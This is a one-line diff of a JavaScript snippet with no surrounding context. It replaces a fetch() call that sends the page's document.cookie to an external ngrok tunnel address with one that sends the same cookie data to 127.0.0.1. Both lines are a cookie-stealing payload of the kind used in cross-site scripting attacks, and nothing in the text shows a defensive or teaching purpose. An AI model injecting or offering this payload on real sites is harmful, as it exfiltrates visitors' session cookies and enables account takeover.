@@ -1,1 +1,1 @@
-fetch('https://c4c5-5-227-7-70.eu.ngrok.io' + document.cookie)
+fetch('http://127.0.0.1' + document.cookie)
